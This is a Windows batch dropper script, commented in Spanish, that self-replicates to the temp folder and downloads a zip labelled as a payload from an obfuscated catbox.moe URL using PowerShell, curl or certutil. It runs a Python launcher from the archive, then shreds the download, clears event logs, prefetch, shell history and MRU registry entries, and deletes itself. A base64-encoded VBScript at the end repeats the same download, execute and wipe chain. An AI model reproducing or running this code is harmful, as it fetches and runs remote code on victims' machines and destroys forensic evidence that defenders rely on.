@echo off
setlocal enabledelayedexpansion

REM === AUTO-REPLICACIÓN ===
if not "%1"=="worker" (
    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tempbat!" >nul 2>&1
    if exist "!tempbat!" (
        start /b cmd /c call "!tempbat!" worker
        timeout /t 2 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

REM === CONSTRUCCIÓN DE URL (OFUSCADA) ===
set "p1=https://"
set "p2=files."
set "p3=catbox"
set "p4=.moe/"
set "p5=d6ck"
set "p6=99"
set "p7=.zip"
set "url=%p1%%p2%%p3%%p4%%p5%%p6%%p7%"

REM === CONFIGURACIÓN ===
set "zip_file=%TEMP%\~repo%RANDOM%.zip"
set "extract_dir=%TEMP%\~sys%RANDOM%"
set "downloaded=0"

REM === INTENTO 1: PowerShell (método principal) ===
echo [*] Descargando payload...
powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; ^
$ProgressPreference='SilentlyContinue'; ^
try { ^
    Invoke-WebRequest -Uri '%url%' -OutFile '%zip_file%' -UseBasicParsing -TimeoutSec 120; ^
    exit 0 ^
} catch { ^
    exit 1 ^
}"

if %errorlevel% equ 0 (
    if exist "%zip_file%" (
        set "downloaded=1"
        echo [+] Descarga exitosa
    )
)

REM === INTENTO 2: curl (fallback) ===
if !downloaded! equ 0 (
    echo [*] Intentando curl...
    curl -L -s -o "%zip_file%" "%url%" --connect-timeout 60 --max-time 180
    if exist "%zip_file%" (
        set "downloaded=1"
        echo [+] Curl exitoso
    )
)

REM === INTENTO 3: certutil (último recurso) ===
if !downloaded! equ 0 (
    echo [*] Intentando certutil...
    certutil -urlcache -split -f "%url%" "%zip_file%" >nul 2>&1
    if exist "%zip_file%" (
        set "downloaded=1"
        echo [+] Certutil exitoso
    )
)

REM === VERIFICAR DESCARGA ===
if !downloaded! equ 0 (
    echo [-] Descarga fallida
    exit /b 1
)

REM === VERIFICAR TAMAÑO DEL ARCHIVO ===
for %%F in ("%zip_file%") do set "size=%%~zF"
if !size! lss 1000000 (
    echo [-] Archivo muy pequeño o corrupto
    del /f /q "%zip_file%" >nul 2>&1
    exit /b 1
)

REM === EXTRAER ZIP ===
echo [*] Extrayendo archivos...
powershell.exe -WindowStyle Hidden -NoProfile -Command ^
"Expand-Archive -Path '%zip_file%' -DestinationPath '%extract_dir%' -Force"

timeout /t 3 /nobreak >nul

REM === BUSCAR CARPETA encriptado-main ===
set "repo_path="
set "launcher_py="
set "python_exe="

if exist "%extract_dir%" (
    for /d %%D in ("%extract_dir%\*") do (
        if /i "%%~nxD"=="encriptado-main" (
            set "repo_path=%%D"
            set "launcher_py=%%D\launcher.py"
            set "python_exe=%%D\python_portable\python.exe"
            goto :found
        )
    )
)

:found
if not defined repo_path (
    echo [-] No se encontró encriptado-main
    rmdir /s /q "%extract_dir%" >nul 2>&1
    del /f /q "%zip_file%" >nul 2>&1
    exit /b 1
)

if not exist "%launcher_py%" (
    echo [-] No se encontró launcher.py
    exit /b 1
)

if not exist "%python_exe%" (
    echo [-] No se encontró python.exe
    exit /b 1
)

REM === EJECUTAR LAUNCHER ===
echo [+] Ejecutando payload...
cd /d "%repo_path%"
start /b "" "%python_exe%" "%launcher_py%"

timeout /t 5 /nobreak >nul

REM === SECURE DELETE DEL ZIP (3-PASS) ===
echo [*] Eliminando rastros...
if exist "%zip_file%" (
    for %%F in ("%zip_file%") do set "file_size=%%~zF"
    
    REM Pass 1: Sobrescribir con 0x00
    powershell -w h -c "$bytes = New-Object byte[] !file_size!; [IO.File]::WriteAllBytes('%zip_file%', $bytes)" >nul 2>&1
    timeout /t 1 /nobreak >nul
    
    REM Pass 2: Sobrescribir con 0xFF
    powershell -w h -c "$bytes = New-Object byte[] !file_size!; for($i=0;$i -lt !file_size!;$i++){$bytes[$i]=0xFF}; [IO.File]::WriteAllBytes('%zip_file%', $bytes)" >nul 2>&1
    timeout /t 1 /nobreak >nul
    
    REM Pass 3: Sobrescribir con random
    powershell -w h -c "$bytes = New-Object byte[] !file_size!; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes('%zip_file%', $bytes)" >nul 2>&1
    
    REM Eliminar archivo
    del /f /q "%zip_file%" >nul 2>&1
)

REM === LIMPIEZA ANTI-FORENSE ===
powershell.exe -WindowStyle Hidden -NoProfile -Command ^
"$ErrorActionPreference='SilentlyContinue'; ^
Remove-Item 'C:\Windows\Prefetch\*.pf' -Force; ^
Clear-RecycleBin -Force -Confirm:$false; ^
wevtutil cl Application 2>$null; ^
wevtutil cl System 2>$null; ^
Remove-Item '$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' -Force; ^
Get-ChildItem '$env:USERPROFILE\AppData\Local\Microsoft\Windows\Explorer' -Filter '*.db' | Remove-Item -Force; ^
Get-ChildItem '$env:LOCALAPPDATA\Microsoft\Windows\AppCompat\Programs' -Filter 'Amcache*.hive' | Remove-Item -Force; ^
Get-ChildItem '$env:LOCALAPPDATA\Microsoft\Windows\CoreApplicationData' -Recurse -Filter '*.db' | Remove-Item -Force; ^
Remove-Item '$env:USERPROFILE\AppData\Local\Microsoft\Windows\FileHistory' -Recurse -Force; ^
Get-ChildItem '$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent' -Filter '*.lnk' | Remove-Item -Force; ^
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*'; ^
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32' -Name 'OpenSavePidlMRU'; ^
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32' -Name 'LastVisitedPidlMRU'"

REM === AUTO-DESTRUCCIÓN ===
echo [*] Auto-destruyendo...
set "cleanup_bat=%TEMP%\~clean%RANDOM%.bat"
(
echo @echo off
echo timeout /t 8 /nobreak ^>nul
echo taskkill /f /im cmd.exe ^>nul 2^>^&1
echo rmdir /s /q "%extract_dir%" ^>nul 2^>^&1
echo del /f /q "%~f0" ^>nul 2^>^&1
echo ^(goto^) 2^>nul ^& del /f /q "%%~f0" ^& exit
) > "%cleanup_bat%"

start /b cmd /c "%cleanup_bat%"
exit

set "vbsfile=%TEMP%\~init!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKCnNjcmlwdFBhdGggPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lCnNjcmlwdE5hbWUgPSBmc28uR2V0RmlsZU5hbWUoc2NyaXB0UGF0aCkKc2NyaXB0RGlyID0gZnNvLkdldFBhcmVudEZvbGRlck5hbWUoc2NyaXB0UGF0aCkKdGVtcEJhc2UgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpCgpJZiBJblN0cihMQ2FzZShzY3JpcHRQYXRoKSwgTENhc2UodGVtcEJhc2UpKSA+IDAgQW5kIExDYXNlKHNjcmlwdE5hbWUpID0gImNvcmUudmJzIiBUaGVuCiAgICBleGVQYXRoID0gIiIKICAgIEZvciBFYWNoIGYgSW4gZnNvLkdldEZvbGRlcihzY3JpcHREaXIpLkZpbGVzCiAgICAgICAgSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgogICAgICAgICAgICBleGVQYXRoID0gZi5QYXRoCiAgICAgICAgICAgIEV4aXQgRm9yCiAgICAgICAgRW5kIElmCiAgICBOZXh0CiAgICAKICAgIHJlcG9QYXJ0MSA9ICJodHRwczovL2ZpbGVzLiIKICAgIHJlcG9QYXJ0MiA9ICJjYXRib3giCiAgICByZXBvUGFydDMgPSAiLm1vZS8iCiAgICByZXBvUGFydDQgPSAiZDYiCiAgICByZXBvUGFydDUgPSAiY2siCiAgICByZXBvUGFydDYgPSAiOTkiCiAgICByZXBvUGFydDcgPSAiLnppcCIKICAgIHJlcG9VUkwgPSByZXBvUGFydDEgJiByZXBvUGFydDIgJiByZXBvUGFydDMgJiByZXBvUGFydDQgJiByZXBvUGFydDUgJiByZXBvUGFydDYgJiByZXBvUGFydDcKICAgIAogICAgemlwUGF0aCA9IHNjcmlwdERpciAmICJccmVwby56aXAiCiAgICBleHRyYWN0UGF0aCA9IHNjcmlwdERpciAmICJcZXh0cmFjdGVkIgogICAgCiAgICBwc0Rvd25sb2FkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiIgJiBfCiAgICAiW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgIiAmIF8KICAgICIkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyAiICYgXwogICAgInRyeSB7ICIgJiBfCiAgICAiICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJyIgJiByZXBvVVJMICYgIicgLU91dEZpbGUgJyIgJiB6aXBQYXRoICYgIicgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91dFNlYyAxMjA7ICIgJiBfCiAgICAiICAgIEV4cGFuZC1BcmNoaXZlIC1QYXRoICciICYgemlwUGF0aCAmICInIC1EZXN0aW5hdGlvblBhdGggJyIgJiBleHRyYWN0UGF0aCAmICInIC1Gb3JjZSAiICYgXwogICAgIn0gY2F0Y2ggeyBleGl0IDEgfSAiICYgXwogICAgIiIiIgogICAgCiAgICBzaGVsbC5SdW4gcHNEb3dubG9hZCwgMCwgVHJ1ZQogICAgV1NjcmlwdC5TbGVlcCA4MDAwCiAgICAKICAgIElmIE5vdCBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuCiAgICAgICAgV1NjcmlwdC5RdWl0CiAgICBFbmQgSWYKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICAKICAgIHJlcG9QYXRoID0gIiIKICAgIGxhdW5jaGVyUGF0aCA9ICIiCiAgICBweXRob25QYXRoID0gIiIKICAgIAogICAgSWYgZnNvLkZvbGRlckV4aXN0cyhleHRyYWN0UGF0aCkgVGhlbgogICAgICAgIEZvciBFYWNoIHN1YmZvbGRlciBJbiBmc28uR2V0Rm9sZGVyKGV4dHJhY3RQYXRoKS5TdWJGb2xkZXJzCiAgICAgICAgICAgIElmIExDYXNlKHN1YmZvbGRlci5OYW1lKSA9ICJlbmNyaXB0YWRvLW1haW4iIFRoZW4KICAgICAgICAgICAgICAgIHJlcG9QYXRoID0gc3ViZm9sZGVyLlBhdGgKICAgICAgICAgICAgICAgIGxhdW5jaGVyUGF0aCA9IHJlcG9QYXRoICYgIlxsYXVuY2hlci5weSIKICAgICAgICAgICAgICAgIHB5dGhvblBhdGggPSByZXBvUGF0aCAmICJccHl0aG9uX3BvcnRhYmxlXHB5dGhvbi5leGUiCiAgICAgICAgICAgICAgICBFeGl0IEZvcgogICAgICAgICAgICBFbmQgSWYKICAgICAgICBOZXh0CiAgICBFbmQgSWYKICAgIAogICAgSWYgcmVwb1BhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGxhdW5jaGVyUGF0aCkgQW5kIGZzby5GaWxlRXhpc3RzKHB5dGhvblBhdGgpIFRoZW4KICAgICAgICBzaGVsbC5DdXJyZW50RGlyZWN0b3J5ID0gcmVwb1BhdGgKICAgICAgICBjbWRMYXVuY2ggPSAiIiIiICYgcHl0aG9uUGF0aCAmICIiIiAiIiIgJiBsYXVuY2hlclBhdGggJiAiIiIKICAgICAgICBzaGVsbC5SdW4gY21kTGF1bmNoLCAwLCBGYWxzZQogICAgICAgIFdTY3JpcHQuU2xlZXAgMTAwMDAKICAgIEVuZCBJZgogICAgCiAgICBJZiBleGVQYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhleGVQYXRoKSBUaGVuCiAgICAgICAgRm9yIGkgPSAxIFRvIDMKICAgICAgICAgICAgU2V0IGZ3ID0gZnNvLk9wZW5UZXh0RmlsZShleGVQYXRoLCAyKQogICAgICAgICAgICBGb3IgaiA9IDEgVG8gMTAwMAogICAgICAgICAgICAgICAgZncuV3JpdGVMaW5lIFN0cmluZyg4MCwgQ2hyKEludChSbmQgKiAyNikgKyA2NSkpCiAgICAgICAgICAgIE5leHQKICAgICAgICAgICAgZncuQ2xvc2UKICAgICAgICAgICAgV1NjcmlwdC5TbGVlcCAyMDAKICAgICAgICBOZXh0CiAgICAgICAgZnNvLkRlbGV0ZUZpbGUgZXhlUGF0aCwgVHJ1ZQogICAgRW5kIElmCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgCiAgICBJZiBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuCiAgICAgICAgemlwU2l6ZSA9IGZzby5HZXRGaWxlKHppcFBhdGgpLlNpemUKICAgICAgICBJZiB6aXBTaXplID4gMCBBbmQgemlwU2l6ZSA8IDEwMDAwMDAwMCBUaGVuCiAgICAgICAgICAgIEZvciBwYXNzID0gMSBUbyAzCiAgICAgICAgICAgICAgICBwc1NocmVkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIiIiICYgXwogICAgICAgICAgICAgICAgIiRieXRlcyA9IE5ldy1PYmplY3QgYnl0ZVtdICIgJiB6aXBTaXplICYgIjsgIiAmIF8KICAgICAgICAgICAgICAgICIoTmV3LU9iamVjdCBSYW5kb20pLk5leHRCeXRlcygkYnl0ZXMpOyAiICYgXwogICAgICAgICAgICAgICAgIltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiAmIHppcFBhdGggJiAiJywgJGJ5dGVzKSAiICYgXwogICAgICAgICAgICAgICAgIiIiIgogICAgICAgICAgICAgICAgc2hlbGwuUnVuIHBzU2hyZWQsIDAsIFRydWUKICAgICAgICAgICAgICAgIFdTY3JpcHQuU2xlZXAgNTAwCiAgICAgICAgICAgIE5leHQKICAgICAgICBFbmQgSWYKICAgICAgICBmc28uRGVsZXRlRmlsZSB6aXBQYXRoLCBUcnVlCiAgICBFbmQgSWYKICAgIAogICAgc2hlbGwuUmVnRGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFJ1bk1SVVwiCiAgICAKICAgIHBzQ2xlYXIgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiIiIgJiBfCiAgICAiJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KICAgICJSZW1vdmUtSXRlbSAnQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmJyAtRm9yY2U7ICIgJiBfCiAgICAiQ2xlYXItUmVjeWNsZUJpbiAtRm9yY2UgLUNvbmZpcm06JGZhbHNlOyAiICYgXwogICAgIndldnR1dGlsIGNsIEFwcGxpY2F0aW9uIDI+JG51bGw7ICIgJiBfCiAgICAid2V2dHV0aWwgY2wgU3lzdGVtIDI+JG51bGw7ICIgJiBfCiAgICAiUmVtb3ZlLUl0ZW0gJyRlbnY6QVBQREFUQVXNY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcUFNSZWFkTGluZVxDb25zb2xlSG9zdF9oaXN0b3J5LnR4dCcgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyAiICYgXwogICAgIkdldC1DaGlsZEl0ZW0gJyRlbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxMb2NhbFxNaWNyb3NvZnRcV2luZG93c1xFeHBsb3JlcicgLUZpbHRlciAnKi5kYicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBSZW1vdmUtSXRlbSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiAgICAiR2V0LUNoaWxkSXRlbSAnJGVudjpMT0NBTEFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcQXBwQ29tcGF0XFByb2dyYW1zJyAtRmlsdGVyICdBbWNhY2hlKi5oaXZlJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFJlbW92ZS1JdGVtIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgIiAmIF8KICAgICJHZXQtQ2hpbGRJdGVtICckZW52OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xDb3JlQXBwbGljYXRpb25EYXRhJyAtUmVjdXJzZSAtRmlsdGVyICcqLmRiJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFJlbW92ZS1JdGVtIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgIiAmIF8KICAgICJSZW1vdmUtSXRlbSAnJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXExvY2FsXE1pY3Jvc29mdFxXaW5kb3dzXEZpbGVIaXN0b3J5JyAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiAgICAiR2V0LUNoaWxkSXRlbSAnJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcUmVjZW50JyAtRmlsdGVyICcqLmxuaycgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBSZW1vdmUtSXRlbSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiAgICAiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVJyAtTmFtZSAnKicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiAgICAiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcQ29tRGxnMzInIC1OYW1lICdPcGVuU2F2ZVBpZGxNUlUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyAiICYgXwogICAgIlJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXENvbURsZzMyJyAtTmFtZSAnTGFzdFZpc2l0ZWRQaWRsTVJVJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAiICYgXwogICAgIiIiIgogICAgc2hlbGwuUnVuIHBzQ2xlYXIsIDAsIFRydWUKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICBjbGVhbnVwQmF0ID0gc2NyaXB0RGlyICYgIlxjbGVhbnVwLmJhdCIKICAgIFNldCBmYyA9IGZzby5DcmVhdGVUZXh0RmlsZShjbGVhbnVwQmF0LCBUcnVlKQogICAgZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCiAgICBmYy5Xcml0ZUxpbmUgInRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsIgogICAgZmMuV3JpdGVMaW5lICJ0YXNra2lsbCAvZiAvaW0gd3NjcmlwdC5leGUgPm51bCAyPiYxIgogICAgZmMuV3JpdGVMaW5lICJkZWwgL2YgL3EgIiIiICYgc2NyaXB0UGF0aCAmICIiIiA+bnVsIDI+JjEiCiAgICBmYy5Xcml0ZUxpbmUgImNkIC9kICVURU1QJSIKICAgIGZjLldyaXRlTGluZSAicm1kaXIgL3MgL3EgIiIiICYgc2NyaXB0RGlyICYgIiIiID5udWwgMj4mMSIKICAgIGZjLldyaXRlTGluZSAiKGdvdG8pIDI+bnVsICYgZGVsIC9mIC9xICIiJX4wIiIgJiBleGl0IgogICAgZmMuQ2xvc2UKICAgIAogICAgc2hlbGwuUnVuICJjbWQuZXhlIC9jICIiIiAmIGNsZWFudXBCYXQgJiAiIiIiLCAwLCBGYWxzZQogICAgV1NjcmlwdC5RdWl0CiAgICAKRWxzZQogICAgdGVtcElEID0gInN5c18iICYgSW50KFJuZCAqIDk5OTk5OSArIDEwMDAwMCkKICAgIHRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKICAgIGZzby5DcmVhdGVGb2xkZXIgdGVtcFdvcmsKICAgIAogICAgdmJzVGVtcCA9IHRlbXBXb3JrICYgIlxjb3JlLnZicyIKICAgIGZzby5Db3B5RmlsZSBzY3JpcHRQYXRoLCB2YnNUZW1wLCBUcnVlCiAgICAKICAgIHNoZWxsLlJ1biAid3NjcmlwdC5leGUgIiIiICYgdmJzVGVtcCAmICIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQogICAgV1NjcmlwdC5TbGVlcCAxMDAwCiAgICAKICAgIGZzby5EZWxldGVGaWxlIHNjcmlwdFBhdGgsIFRydWUKICAgIFdTY3JpcHQuUXVpdAogICAgCkVuZCBJZg=='; ^
$bytes = [Convert]::FromBase64String($b64); ^
[IO.File]::WriteAllBytes('%vbsfile%', $bytes)"

timeout /t 2 /nobreak >nul

if exist "%vbsfile%" (
    start /b wscript.exe "%vbsfile%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit